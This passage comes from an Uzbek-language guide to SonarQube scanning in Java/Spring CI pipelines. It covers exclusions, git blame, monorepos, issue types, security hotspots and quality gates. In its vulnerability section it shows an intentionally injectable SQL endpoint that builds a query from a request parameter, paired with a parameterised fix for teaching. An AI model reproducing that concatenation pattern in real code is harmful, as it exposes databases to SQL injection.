Uchta ishga tushirish usuli bir xil natijaga olib kelmaydi, chunki ularning kirish ma'lumoti boshqacha. Maven plugin `mvn sonar:sonar` orqali ishlaydi va modul daraxtini, klasspathni, manba va test papkalarini POM dan oladi. Gradle da `org.sonarqube` plugin i ham xuddi shunday, source set lardan foydalanadi. Mustaqil `sonar-scanner` esa hech narsani bilmaydi: siz nima yozsangiz shuni o'qiydi.

```bash
# Maven: avval test va coverage, keyin tahlil. Ikki buyruq alohida bo'lishi afzal.
mvn -B clean verify
mvn -B sonar:sonar -Dsonar.projectKey=uz.example:payment-service

# Gradle: sonar task build dan keyin chaqiriladi.
./gradlew clean test jacocoTestReport
./gradlew sonar -Dsonar.projectKey=uz.example:payment-service

# Quality gate natijasini kutib, yiqilsa build ni to'xtatish.
mvn -B sonar:sonar -Dsonar.qualitygate.wait=true
```

`mvn clean verify sonar:sonar` ni bitta qatorda yozish ishlaydi, lekin bir kamchiligi bor: test yiqilsa tahlil umuman bo'lmaydi va siz serverda hech narsa ko'rmaysiz. Ikkiga ajratib, test natijasidan qat'i nazar tahlilni yuborish ko'proq ma'lumot beradi. Qaysi yondashuv to'g'ri ekani jamoa qoidasiga bog'liq.

| Vaziyat | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Konfiguratsiya joyi | Har CI job ichida `-D` flaglar uyumi | `sonar-project.properties` yoki POM da versiyalanadi |
| Coverage ulash | "Sonar coverage ni o'zi topadi" deb kutish | JaCoCo XML yo'li aniq beriladi va build da tekshiriladi |
| Klasspath | Hech narsa qilinmaydi, ogohlantirish o'qilmaydi | Maven plugin ishlatiladi, log da klasspath tasdiqlanadi |
| Exclusion | Muammoli papkani butunlay chiqarib tashlash | Fayl darajasida aniq, izohi bilan va muddati bilan |
| SCM | `shallow clone` tezroq deb qoldiriladi | `fetch-depth: 0`, blame to'liq ishlaydi |
| Monorepo | Bitta `projectKey`, umumiy gate | Servis bo'yicha alohida kalit va alohida mas'ul |
| Gate natijasi | Dashboard qo'lda ochib ko'riladi | `sonar.qualitygate.wait=true` bilan pipeline to'xtaydi |
| Yangi kod | Default sozlama o'z holiga tashlanadi | New code ta'rifi relizga qarab ataylab tanlanadi |
| Tahlil vaqti | Sekinlashsa shikoyat qilinadi | Kesh, modul bo'linishi va exclusion o'lchanadi |
| Xato diagnostikasi | "Sonar buzuq" deb xulosa qilinadi | `-X` yoki `sonar.verbose=true` bilan log o'qiladi |

### 2.6 Scanner qaysi fayllarni umuman ko'rmaydi

Tahlildan chiqarishning bir necha darajasi bor va ularni aralashtirib yuborish katta xatoga olib keladi. `sonar.exclusions` faylni butunlay ko'rinmas qiladi: na issue, na coverage, na duplication. `sonar.coverage.exclusions` faylni tahlilda qoldiradi, lekin coverage hisobidan chiqaradi. `sonar.cpd.exclusions` esa faqat duplication tekshiruvini o'chiradi. Konfiguratsiya klasslari va DTO larni coverage dan chiqarish odatda to'g'ri qaror, ularni butunlay yashirish esa emas.

```properties
# Butunlay ko'rinmas: generatsiya qilingan va migratsiya fayllari.
sonar.exclusions=\
  **/generated/**,\
  **/target/generated-sources/**,\
  **/*MapperImpl.java
# Tahlilda qoladi, lekin coverage talab qilinmaydi.
sonar.coverage.exclusions=\
  **/config/**,\
  **/*Application.java,\
  **/dto/**
# Duplication tekshirilmaydi: DTO va entity da takror maydon normal.
sonar.cpd.exclusions=**/dto/**,**/entity/**
# Test kodining bir qismini chiqarish uchun alohida parametr.
sonar.test.exclusions=**/*ManualTest.java
```

Bundan tashqari scanner standart holda ham ba'zi narsalarni o'tkazib yuboradi. Build chiqish papkalari (`target`, `build`), `node_modules` kabi paket papkalari va `.gitignore` da yashiringan fayllar odatda tahlilga tushmaydi. Ikkilik fayllar va juda katta fayllar ham chetlab o'tiladi. Bu ro'yxat scanner va til plugin i versiyasiga qarab farq qiladi, shuning uchun aniq ro'yxatga tayanmaslik, log dagi "indexed files" sonini tekshirish ishonchliroq.

Alohida eslatma: `sonar.exclusions` ni "gate ni o'tkazish" vositasi sifatida ishlatish texnik qarz emas, balki o'lchovni buzish. Coverage 80% ga yetmayotgan bo'lsa, qoplanmagan paketni exclusion ga qo'shish raqamni ko'taradi, sifatni esa yo'q. Agar shunday qaror zarur bo'lsa, uni izoh bilan va qayta ko'rish muddati bilan yozish kerak.

### 2.7 Tahlilni lokal tekshirish va ogohlantirishlarni o'qish

Scanner log i uzun, lekin undagi uch narsa butun tahlil taqdirini belgilaydi: indekslangan fayllar soni, coverage hisoboti topilganmi va klasspath to'ldirilganmi. Bu uchtasini har CI da ko'z bilan emas, grep bilan tekshirish mumkin.

```bash
# Tahlilni yuborishdan oldin lokal tekshirish: natijani faylga yozib olamiz.
mvn -B sonar:sonar -Dsonar.verbose=true | tee /tmp/sonar.log

# 1) Nechta fayl indekslandi? Nol yoki juda kam bo'lsa sources noto'g'ri.
grep -E "indexed files|Source files|Test files" /tmp/sonar.log

# 2) Coverage hisoboti o'qildimi?
grep -iE "jacoco|coverage report" /tmp/sonar.log

# 3) Klasspath bo'shmi? Shu ogohlantirish bo'lsa qoidalar yarim ishlaydi.
grep -i "bytecode of dependencies" /tmp/sonar.log

# 4) Hisobot topilmagan bo'lsa ham scanner yiqilmaydi, faqat WARN yozadi.
grep -c "WARN" /tmp/sonar.log
```

Eng muhim xulosa shu: scanner ko'pchilik muammoda xato bermaydi, ogohlantirish bilan davom etadi. Bu qulay, lekin xavfli. Shuning uchun pipeline da WARN larni o'qiydigan kichik qadam qo'yish yoki kalit ogohlantirishlar uchun grep bilan tekshirish amalda juda ko'p vaqt tejaydi.

### 2.8 SCM ma'lumoti: blame nega kerak

Sonar har bir qator uchun oxirgi o'zgarish sanasini va muallifini git blame dan oladi. Bu ma'lumot ikki joyda hal qiluvchi: "new code" ni aniqlashda va issue ni kimga biriktirishda. Agar blame ishlamasa, Sonar qaysi qator yangi ekanini bilmaydi va "new code on overall code" chalkashligi boshlanadi.

CI da eng ko'p uchraydigan sabab `shallow clone`. Ko'p tizimda default `fetch-depth: 1` bo'ladi, ya'ni faqat bitta commit yuklanadi. Bunda blame butun faylni bitta commit ga yozadi va yangi kod ta'rifi buziladi. Yechim oddiy: to'liq tarixni yuklash.

```yaml
name: ci
on:
  pull_request:
jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          # 0 degani to'liq tarix. Blame va "new code" uchun majburiy.
          fetch-depth: 0
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'
      - name: Test va coverage
        run: mvn -B clean verify
      - name: Sonar tahlili
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
        run: mvn -B sonar:sonar -Dsonar.qualitygate.wait=true
```

Agar git tarixi haqiqatan ham mavjud bo'lmasa (masalan arxivdan ko'chirilgan kod), `sonar.scm.disabled=true` bilan SCM ni o'chirish mumkin. Lekin bu yechim emas, kechirim: new code bo'yicha gate shartlari ishonchsiz bo'lib qoladi. Odatda `sonar.scm.provider=git` ni aniq yozib qo'yish va fetch sozlamasini tuzatish to'g'riroq.

### 2.9 Monorepo va ko'p modulli loyiha

Ko'p modulli Maven loyihasi Sonar uchun bitta loyiha bo'lib ko'rinadi va bu ko'pincha to'g'ri: `mvn sonar:sonar` ildizdan ishga tushadi, har modul alohida komponent sifatida indekslanadi, coverage esa modullarni kesib o'tadi. Muhim shart: agregat coverage hisobotini to'g'ri yig'ish, ya'ni bitta modulning testi boshqa modul kodini qoplasa, bu XML larda ko'rinishi kerak.

Monorepo da bir nechta mustaqil servis bo'lsa, vaziyat boshqacha. Bitta `projectKey` ostida birlashtirish qulay ko'rinadi, lekin natija yoqimsiz: bir jamoaning past coverage i boshqasining PR ini bloklaydi va mas'uliyat yuviladi. Amalda har deploylanadigan birlik uchun alohida kalit va alohida gate ishonchliroq.

```bash
# Monorepo: har servis o'z kaliti, o'z base dir i bilan tahlil qilinadi.
for svc in order-service payment-service inventory-service; do
  mvn -B -pl "$svc" -am clean verify
  mvn -B -pl "$svc" sonar:sonar \
    -Dsonar.projectKey="uz.example:$svc" \
    -Dsonar.projectBaseDir="$PWD/$svc" \
    -Dsonar.qualitygate.wait=true
done
# CI da faqat o'zgargan servisni tahlil qilish vaqtni sezilarli qisqartiradi.
```

PR tahlilida yana bir nozik joy bor: scanner `sonar.pullrequest.key`, `sonar.pullrequest.branch` va `sonar.pullrequest.base` parametrlari bilan ishlasa, natija alohida PR konteksti sifatida saqlanadi va asosiy branch tarixini ifloslantirmaydi. Ko'p CI integratsiyasi buni avtomatik to'ldiradi, lekin o'z skripti bilan ishlayotgan jamoa buni qo'lda berishi kerak.

### 2.10 Scanner keshi, vaqt va takroriy tahlil

Scanner ishga tushganda loyiha ildizida `.scannerwork` papkasini yaratadi va u yerga ichki holat bilan birga `report-task.txt` ni yozadi. Shu fayl ichida tahlil natijasi joylashgan URL va task id bo'ladi, shuning uchun pipeline ning keyingi qadamida natijaga havola berish uchun undan foydalanish mumkin. Bu papkani build artifact sifatida saqlash diagnostikani ancha osonlashtiradi.

Tahlil vaqti asosan ikki narsaga ketadi: fayllarni indekslash va semantik tahlil. Shuning uchun vaqtni qisqartirishning real yo'llari ham shu ikki joyda. Generatsiya qilingan kodni exclusion ga olish indekslashni kamaytiradi. Monorepo da faqat o'zgargan modulni tahlil qilish eng katta foyda beradi. Gradle da `sonar.gradle.skipCompile` kabi parametrlar bilan qayta kompilyatsiyani o'tkazib yuborish mumkin, lekin bunda binaries allaqachon mavjud bo'lishi shart.

Takroriy tahlil haqida muhim fakt: bir xil kodni ikki marta yuborish issue larni ikkilantirmaydi. Sonar har tahlilda loyihaning yangi holatini quradi va eski issue larni fayl, qoida va kod konteksti bo'yicha moslaydi. Shu sababli kod qatorlarini ko'chirish issue ni "yangi" qilib qo'yishi mumkin, holbuki mazmunan u o'sha eski muammo. Katta refaktoring dan keyin new code bo'yicha gate kutilmaganda qizil bo'lishining sababi odatda shu.

Nihoyat, CI keshi bilan ehtiyot bo'lish kerak. Maven repository keshini saqlash foydali. Lekin `target` papkasini keshlash xavfli: eski `.class` fayllar yangi manba kod bilan birga yuborilsa, semantik tahlil mos kelmaydigan model quradi va tushunarsiz natija beradi. Har tahlil oldidan `clean` ishlatish bu sinfdagi muammolarni butunlay yo'q qiladi.

### 2.11 Amalda qo'llash

- [ ] `sonar-project.properties` yoki POM da `sonar.sources` va `sonar.tests` aniq ajratilganini tekshiring, test papkasi manba ro'yxatida bo'lmasin.
- [ ] JaCoCo `report` goal ni `verify` fazasiga ulab, `target/site/jacoco/jacoco.xml` faylining build dan keyin haqiqatan mavjudligini tasdiqlang.
- [ ] Scanner log ini `grep "bytecode of dependencies"` bilan tekshirib, klasspath bo'sh emasligiga ishonch qiling.
- [ ] CI checkout qadamiga `fetch-depth: 0` qo'shing va blame ishlayotganini `git log -1` bilan tasdiqlang.
- [ ] Barcha mavjud `sonar.exclusions` qatorlarini qayta ko'rib chiqing: har biriga izoh yozing va coverage ni ko'tarish uchun qo'yilganlarini `sonar.coverage.exclusions` ga ko'chiring yoki olib tashlang.
- [ ] Monorepo bo'lsa har deploylanadigan servisga alohida `sonar.projectKey` ajratib, faqat o'zgargan servisni tahlil qiladigan qilib pipeline ni sozlang.
- [ ] `sonar.qualitygate.wait=true` ni yoqib, gate yiqilganda pipeline ning to'xtashini tekshirib ko'ring.
- [ ] CI da `target` papkasi keshlanmayotganini va har tahlil `clean` bilan boshlanishini tasdiqlang.

## 3. Issue turlari: bug, vulnerability, code smell, security hotspot (Issue Types)

Sonar topgan har bir muammo bitta umumiy "xato" qutisiga tushmaydi. Analizator har bir topilmani turga, ta'sirga va tuzatish bahosiga ajratadi, chunki quality gate aynan shu toifalar ustida shart qo'yadi. Developer uchun amaliy ma'no shu: bir xil ko'rinishdagi ikki topilmadan biri build ni to'xtatadi, ikkinchisi faqat ro'yxatda qoladi. Shu bo'limda har bir tur qanday aniqlanadi, kim qaror qabul qiladi va qarorni qanday hujjatlashtirish kerakligini ko'rib chiqamiz.

### 3.1 Bug: ta'rifi, Sonar uni qanday aniqlaydi, Java dan misollar

Bug deganda Sonar kodning ishlash vaqtida noto'g'ri natija berishi yoki ishdan chiqishi ehtimoli yuqori bo'lgan holatni tushunadi. Bu uslub masalasi emas. Bu mantiq xatosi: null ga murojaat, yopilmagan resurs, hech qachon bajarilmaydigan shart, almashtirilgan argumentlar.

Aniqlash mexanizmi ikki qatlamli. Birinchi qatlam sintaktik: analizator AST daraxtida naqsh izlaydi, masalan `equals` ichida `getClass` tekshiruvi yo'qligini. Ikkinchi qatlam symbolic execution: Sonar metod ichidagi mumkin bo'lgan bajarilish yo'llarini modellashtiradi va har bir o'zgaruvchi uchun holat to'playdi, masalan NULL, NOT_NULL, OPENED. Agar biror yo'lda NULL holatidagi o'zgaruvchiga murojaat qilinsa, `java:S2259` ishga tushadi. Shu sababli Sonar bug ni ko'rsatganda "yo'l" ni ham beradi: qaysi shart `true` bo'lganda muammo yuzaga keladi.

```java
// Sonar shikoyati: java:S2259 null ga murojaat qilish ehtimoli bor
public BigDecimal hisoblash(Long buyurtmaId) {
    Buyurtma b = buyurtmaRepository.findById(buyurtmaId).orElse(null);
    if (b == null) {
        log.warn("Buyurtma topilmadi: {}", buyurtmaId);
    }
    // bu yerda b null bo'lishi mumkin, lekin murojaat qilinyapti
    return b.getSumma().multiply(SOLIQ);
}

// Sonar o'tadigan variant: null yo'li uzilgan
public BigDecimal hisoblash(Long buyurtmaId) {
    Buyurtma b = buyurtmaRepository.findById(buyurtmaId)
            .orElseThrow(() -> new BuyurtmaTopilmadi(buyurtmaId));
    return b.getSumma().multiply(SOLIQ);
}
```

Ikkinchi klassik misol resurs bilan bog'liq. `java:S2095` yopilishi kerak bo'lgan obyekt barcha yo'llarda yopilmasa ishga tushadi. Exception otilgan yo'lda `close` chaqirilmasa ham qoida gapiradi, shuning uchun `try-with-resources` eng ishonchli yechim.

Bug ni Sonar o'zi tuzatmaydi va o'z holiga tashlab ketish uchun asos ham so'ramaydi. Agar bug chindan ham bug bo'lsa, uni tuzatish kerak. Agar symbolic execution noto'g'ri yo'l qurgan bo'lsa, bu false positive va uni alohida belgilash kerak.

### 3.2 Vulnerability: xavfsizlik zaifligi va uning bug dan farqi

Vulnerability ham xato, lekin uning oqibati noto'g'ri natija emas, balki hujumchi uchun ochilgan yo'l. Farqni tahdid modeli bilan ajratish eng oson: bug o'z-o'zidan yuzaga keladi, vulnerability esa tashqi niyatli ta'sir bilan yuzaga keladi. Yopilmagan `InputStream` bug, chunki u shunchaki resursni tugatadi. Kodga yozib qo'yilgan parol vulnerability, chunki uni o'qigan odam tizimga kiradi.

Sonar vulnerability ni ko'p holatda taint analysis bilan topadi. Analizator "source" ni belgilaydi, masalan HTTP so'rov parametri. Keyin "sink" ni belgilaydi, masalan JDBC `executeQuery`. Agar ma'lumot source dan sink ga yetib borsa va yo'lda "sanitizer" bo'lmasa, injection zaifligi e'lon qilinadi. Shuning uchun Spring da `@RequestParam` dan kelgan qiymatni to'g'ridan to'g'ri SQL ga qo'shish deyarli har doim ushlanadi.

```java
// Zaif: so'rov parametri to'g'ridan to'g'ri SQL ga qo'shilgan
@GetMapping("/hisobot")
public List<Map<String, Object>> hisobot(@RequestParam String filial) {
    String sql = "SELECT * FROM tolov WHERE filial = '" + filial + "'";
    return jdbcTemplate.queryForList(sql);
}

// Himoyalangan: parametr bog'langan, tip tekshirilgan
@GetMapping("/hisobot")
public List<TolovDto> hisobot(@RequestParam @Pattern(regexp = "[A-Z0-9_]{2,16}") String filial) {
    return jdbcTemplate.query(
            "SELECT id, summa, filial FROM tolov WHERE filial = ?",
            new Object[]{filial},
            tolovRowMapper);
}
```

Ikkinchi tez-tez uchraydigan vulnerability turi sir saqlash bilan bog'liq. `java:S2068` kodda qattiq yozilgan parol yoki token ni topadi. Test resurslarida ham ishga tushadi, shuning uchun integratsion test uchun parol kerak bo'lsa, uni Testcontainers o'zi generatsiya qilgan qiymatdan olish to'g'ri yo'l. Bu mavzuning batafsil tomoni testlash qo'llanmasidagi Testcontainers bo'limida.

Vulnerability bilan ishlashda bir muhim jihat bor. Spring Security sozlamasi noto'g'ri bo'lsa, Sonar buni ko'rsatadi, lekin kutubxonaning o'zidagi CVE ni ko'rsatmaydi. Dependency dagi ma'lum zaifliklar alohida vosita ishi: OWASP Dependency-Check, Dependency-Track yoki Sonar ning advanced security qatlamidagi SCA. Versiyaga va litsenziyaga qarab bu imkoniyat farq qiladi.

### 3.3 Code smell: saqlab turish qiyinligi, texnik qarzga qo'shiladigan vaqt

Code smell kod bugun to'g'ri ishlashi mumkin, lekin uni o'zgartirish qimmat bo'lishini bildiradi. Sonar bu yerda sifatni emas, kelajakdagi narxni o'lchaydi. Har bir code smell ga "remediation cost" biriktirilgan: qoidada yozilgan taxminiy tuzatish vaqti. Barcha smell larning vaqti qo'shilib "technical debt" raqamini beradi, u esa development cost ga bo'linib "maintainability rating" harfini chiqaradi.

Eng ko'p uchraydigan smell `java:S3776` cognitive complexity. Bu cyclomatic complexity dan farq qiladi: u shartlar sonini emas, o'qiyotgan odamning miyasidagi yuklamani sanaydi. Har bir ichma-ich joylashish darajasi jarimani oshiradi. Standart chegara metod uchun 15, lekin uni quality profile da o'zgartirish mumkin.

```java
// Sonar shikoyati: java:S3776 cognitive complexity 15 dan oshdi
public Natija qoldiqTekshir(Buyurtma b) {
    if (b != null) {
        if (b.getQatorlar() != null) {
            for (Qator q : b.getQatorlar()) {
                if (q.getSoni() > 0) {
                    Ombor o = omborlar.get(q.getMahsulotId());
                    if (o != null) {
                        if (o.getQoldiq() < q.getSoni()) {
                            if (o.isBuyurtmaOchiq()) {
                                return Natija.kutish(q);
                            } else {
                                return Natija.rad(q);
                            }
                        }
                    }
                }
            }
        }
    }
    return Natija.ok();
}
```

Tuzatish yo'li joylashishni kamaytirish va har bir qarorni alohida metodga chiqarish. Quyidagi variant bir xil mantiqni bajaradi, lekin har bir metodning complexity qiymati chegaradan ancha past.

```java
// Sonar o'tadigan variant: guard clause va ajratilgan qaror
public Natija qoldiqTekshir(Buyurtma b) {
    for (Qator q : b.qatorlariYokiBosh()) {
        Natija n = qatorNatijasi(q);
        if (!n.ok()) {
            return n;
        }
    }
    return Natija.ok();
}

private Natija qatorNatijasi(Qator q) {
    if (q.getSoni() <= 0) {
        return Natija.ok();
    }
    Ombor o = omborlar.get(q.getMahsulotId());
    if (o == null || o.getQoldiq() >= q.getSoni()) {
        return Natija.ok();
    }
    // qoldiq yetmadi: ta'minot buyurtmasi ochiq bo'lsa kutamiz
    return o.isBuyurtmaOchiq() ? Natija.kutish(q) : Natija.rad(q);
}
```

Technical debt raqamini mutlaq qiymatda o'qish foydasiz. "42 kun qarz" degan son loyiha kattaligiga bog'liq. Ma'noli ko'rsatkich debt ratio, ya'ni qarzning kod yozishga ketgan taxminiy vaqtga nisbati. Yangi kod uchun bu nisbat 5 foizdan past bo'lishi odatiy talab.

### 3.4 Security hotspot: nega u avtomatik issue emas, balki qo'lda ko'rib chiqiladi

Security hotspot xavfsizlikka ta'sir qilishi mumkin bo'lgan, lekin kontekstdan tashqari hukm chiqarib bo'lmaydigan kod joyi. Analizator bu yerda "bu xato" demaydi. U "bu joyni odam ko'rib chiqsin" deydi. Sabab oddiy: xuddi shu kod bir loyihada mutlaqo xavfsiz, boshqasida esa ochiq eshik bo'lishi mumkin.

Misol uchun CORS ni hamma manbaga ochish. Ichki tarmoqdagi, faqat o'z frontend i bilan ishlaydigan servis uchun bu qaror ataylab qilingan bo'lishi mumkin. Internetga chiqqan to'lov API uchun bu og'ir xato. Analizator tarmoq topologiyasini bilmaydi, shuning uchun qaror odamga qoldiriladi.

```java
// Security hotspot: CORS siyosati keng ochilgan, ko'rib chiqish kerak
@Configuration
public class WebConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        // "*" ichki servis uchun ongli qaror bo'lishi mumkin,
        // tashqariga chiqqan API uchun esa xavf
        registry.addMapping("/api/**").allowedOrigins("*");
    }
}
```

Shunga o'xshash hotspot lar ro'yxati keng: SQL ni satr sifatida qurish (`java:S2077`), kriptografik tasodifiy son manbasi, fayl yo'lini tashqi qiymatdan yasash, debug yoki actuator endpoint larini ochish, cookie sozlamalari. Hotspot ba'zan vulnerability ga aylanadi: agar ko'rib chiqishda ma'lum bo'lsa, foydalanuvchi kiritgan qiymat shu yo'lga tushadi, demak bu endi hotspot emas, tuzatilishi shart bo'lgan zaiflik.

Amaliy jihat shu: hotspot quality gate ning bug va vulnerability shartlariga tushmaydi. U "security review" shartida hisobga olinadi, ya'ni yangi kodda ko'rib chiqilmagan hotspot qolmasligi talabida. Shuning uchun hotspot ni "o'z-o'zidan hal bo'ladi" deb qoldirish gate ni qizil holatda ushlab turadi.

### 3.5 Hotspot holatlari: to review, acknowledged, fixed, safe

Hotspot o'z hayot siklida to'rt holatdan o'tadi va bu holatni faqat tegishli huquqga ega odam o'zgartiradi.

| Holat | Ma'nosi | Kim qo'yadi | Gate ga ta'siri |
|---|---|---|---|
| To review | Hali hech kim ko'rmagan, yangi topilgan | Analizator avtomatik | Yangi kodda qolsa gate ni qizil qiladi |
| Acknowledged | Ko'rildi, xavf bor deb tan olindi, lekin hozir tuzatilmaydi | Reviewer | Ko'rib chiqilgan hisoblanadi, lekin ro'yxatda qoladi |
| Fixed | Kod o'zgartirildi, xavf yo'q qilindi | Reviewer yoki developer | Ko'rib chiqilgan hisoblanadi |
| Safe | Kontekstda xavf yo'q, kod o'zgarmaydi | Reviewer | Ko'rib chiqilgan hisoblanadi |

Safe va acknowledged orasidagi farqni ko'pchilik aralashtiradi. Safe degani "bu yerda muammo yo'q, chunki kontekst shunday". Acknowledged degani "muammo bor, biz uni bilamiz, hozir boshqa ustuvorlik bor". Ikkinchi holat auditda butunlay boshqacha o'qiladi, shuning uchun uni to'g'ri tanlash muhim. Agar keyinchalik kontekst o'zgarsa, masalan servis internetga chiqarilsa, safe deb belgilangan hotspot lar ro'yxatini qayta ko'rib chiqish kerak.

Holat o'zgarishi kodga bog'lanmaydi, Sonar serverida saqlanadi. Shu sababli bir loyihaning quality tarixini boshqa serverga ko'chirganda hotspot qarorlari yo'qolishi mumkin. Buni oldini olish uchun muhim qarorlarni kod ichida ham izohlab qo'yish amaliyoti foydali.

### 3.6 Yangi toifalash: dasturiy sifat atributlari va ta'sir darajalari (yangi versiyalarda)

SonarQube 10.x liniyasida yangi model kiritildi va u 2025 LTA da asosiy ko'rinishga aylandi. Eski model har bir issue ga bitta tur (bug, vulnerability, code smell) va bitta severity berardi. Yangi model har bir issue ni ikki o'qda tasvirlaydi.

Birinchi o'q software quality attribute: issue kodning qaysi sifatini buzadi. Atributlar guruhi reliability, security, maintainability va shu kabilar. Ikkinchi o'q impact severity: shu sifatga qanchalik kuchli urilgan. Darajalar odatda info, low, medium, high, blocker ko'rinishida beriladi. Bitta issue bir vaqtda bir nechta atributga ta'sir qilishi mumkin, masalan yopilmagan resurs reliability ga ham, maintainability ga ham tegadi.

Amaliy natija: UI da endi "Bugs: 7" degan hisob o'rniga "Reliability: 7 issues, 2 high" ko'rinishi chiqadi. Eski turlar butunlay yo'qolmadi, ular legacy ko'rinishida va API da saqlanib turadi, lekin yangi quality gate shartlari sifat atributlari ustida yoziladi. Agar sizda eski gate sozlangan bo'lsa, migratsiya paytida uni qayta ko'rib chiqish kerak, aks holda ba'zi shartlar kutilganidan yumshoq ishlaydi.

Dashboard va CI skript yozayotganda shuni hisobga oling: `impactSoftwareQuality` va `impactSeverity` filtrlari yangi versiyada mavjud, eski `types` va `severities` filtrlari esa deprecated yo'nalishda. Aniq parametr nomlari versiyaga qarab farq qiladi, shuning uchun skriptni yozishdan oldin o'z serveringizdagi web API hujjatini tekshirish to'g'ri yo'l.

```bash
# Yangi kodda qolgan reliability muammolarini ro'yxatlash
# Token ni o'zgaruvchidan oling, skriptga yozib qo'ymang
curl -sS -u "$SONAR_TOKEN:" \
  "$SONAR_HOST/api/issues/search?componentKeys=tolov-servis&inNewCodePeriod=true&resolved=false&ps=100" \
  | jq -r '.issues[] | [.severity, .rule, .component, .message] | @tsv'

# Ko'rib chiqilmagan security hotspot lar bormi
curl -sS -u "$SONAR_TOKEN:" \
  "$SONAR_HOST/api/hotspots/search?projectKey=tolov-servis&status=TO_REVIEW" \
  | jq '.paging.total'
```

### 3.7 Severity darajalari va ular quality gate ga qanday ta'sir qiladi

Severity o'z-o'zidan build ni to'xtatmaydi. Build ni quality gate shartlari to'xtatadi, severity esa shu shartlarning kirish ma'lumoti. Buni tushunmaslik eng ko'p uchraydigan chalkashlik: developer "bu faqat minor" deb o'tib ketadi, keyin gate rating sharti ustida yiqiladi.

Mexanizm shunday ishlaydi. Har bir issue ning severity si o'zi tegishli rating ni belgilaydi. Masalan, yangi kodda bitta blocker yoki critical darajadagi reliability muammosi bo'lsa, Reliability Rating darhol eng past harfga tushadi. Gate da "Reliability Rating on New Code is A" sharti bo'lsa, bitta critical issue gate ni yiqitadi. O'nlab minor issue esa rating ni A dan tushirmaydi, lekin maintainability debt ratio sharti orqali ta'sir qilishi mumkin.

| Mavzu | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Severity ma'nosi | "Minor bo'lsa e'tibor bermaymiz" | Severity gate shartining kirishi, har birining ta'siri hisoblanadi |
| Gate sozlash | Default gate ni o'zgarishsiz qoldirish | Yangi kod ustida aniq shartli o'z gate ini yozish |
| False positive | Kodga `@SuppressWarnings` tashlash | Sonar da sabab bilan belgilash, qoida xatosi bo'lsa qoidani profildan olish |
| Hotspot | Ro'yxatda qolib ketadi | Har sprint da nol holatga keltirish, qaror yozib qoldirilgan |
| Technical debt | Mutlaq kun sonini kuzatish | Debt ratio va yangi kod trendini kuzatish |
| Issue tarqalishi | Hamma issue ni birdan tuzatishga urinish | Yangi kod bo'yicha qat'iy, eski kodda bosqichma-bosqich |
| Qoida tanlash | Barcha qoidalarni yoqish | Loyihaga mos profil, shovqinli qoidalar o'chirilgan va sababi yozilgan |
| Qaror hujjati | Og'zaki kelishuv | ADR yoki PR izohi, Sonar izohida havola bilan |
| Eski kod | Legacy ni butunlay e'tiborsiz qoldirish | Tegilgan fayl qoidasi: o'zgartirgan joyingni tozalab chiq |
| Migratsiya | Yangi versiyaga o'tib gate ni tekshirmaslik | Yangi sifat atributlariga gate shartlarini qayta yozish |

Gate shartlarini kod sifatida saqlash ham mumkin emas, ular serverda sozlanadi. Lekin CI da gate natijasini kutish va yiqilganda build ni to'xtatish yoziladi.

```yaml
# .github/workflows/sonar.yml dan qism
jobs:
  analiz:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0   # yangi kod hisobi uchun to'liq tarix kerak
      - uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: 'temurin'
      # test va coverage avval, keyin analiz
      - run: ./mvnw -B verify
      - run: >-
          ./mvnw -B sonar:sonar
          -Dsonar.projectKey=tolov-servis
          -Dsonar.qualitygate.wait=true
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
```

`sonar.qualitygate.wait=true` bo'lmasa, scanner ma'lumotni yuborib muvaffaqiyatli tugaydi va gate qizil bo'lsa ham pipeline yashil qoladi. Bu ko'p loyihada e'tibordan chetda qoladigan sozlama.

### 3.8 Issue holati: open, confirmed, resolved, false positive, won't fix

Issue ning holati uning hayot siklini ko'rsatadi va gate hisobiga bevosita ta'sir qiladi.

Open holati yangi topilgan, hali hech kim tegmagan issue. Confirmed degani odam ko'rdi va "ha, bu haqiqiy muammo" dedi, lekin hali tuzatmadi. Bu holat gate dan chiqarib tashlamaydi, u faqat triage ni hujjatlashtiradi. Resolved holatini odatda analizator o'zi qo'yadi: kod o'zgardi, qoida endi ishga tushmaydi, issue avtomatik yopiladi. Agar keyingi analizda muammo qaytsa, issue reopened holatida tiriladi va shu bilan birga "kim regressiya kiritgani" tarixi saqlanadi.

False positive va won't fix esa odam qo'yadigan qarorlar va ular issue ni gate hisobidan chiqaradi. False positive degani qoida xato ishlagan: kodda muammo yo'q. Won't fix degani muammo bor, lekin ataylab shunday qoldiriladi. Yangi versiyalarda won't fix o'rniga "accepted" nomi ishlatiladi va ma'nosi aynan shu: muammo tan olingan, tuzatilmaydi.

Bu ikki holatni aralashtirish auditda og'riq keltiradi. Legacy adapter da ataylab qoldirilgan shim ni false positive deb belgilash yolg'on hisobot beradi, chunki qoida to'g'ri ishlagan. To'g'ri qaror accepted va izohda sabab.

| Tuzoq | Nega yuzaga keladi | Yechim |
|---|---|---|
| Gate yashil, lekin yangi bug kelib tushdi | `sonar.qualitygate.wait` qo'yilmagan | CI da gate natijasini kutish va yiqilsa build ni to'xtatish |
| Yangi kod bo'sh ko'rinadi | shallow clone, `fetch-depth` kichik | To'liq tarix yoki aniq `sonar.newCode` sozlamasi |
| Hamma narsa false positive deb yopilgan | Izoh talab qilinmagan, huquq keng tarqalgan | Huquqni cheklash, izohni majburiy qilish, haftalik audit |
| Generatsiya qilingan kod issue to'ldiradi | Exclusion yozilmagan | `sonar.exclusions` da generatsiya papkalarini chiqarish |
| Test kodi coverage ni buzadi | Test manbasi main sifatida ko'rsatilgan | `sonar.sources` va `sonar.tests` ni aniq ajratish |
| Bir muammo uchun uch xil issue | Bir nechta qoida bir joyga tushgan | Ildizni tuzatish, keyin qolganini tekshirish |
| Hotspot hech qachon kamaymaydi | Review egasi belgilanmagan | Har sprint da mas'ul va nol holat talabi |
| Lokal va CI natijasi farq qiladi | Lokalda coverage report yo'q | `jacoco.xml` yo'lini aniq ko'rsatish |

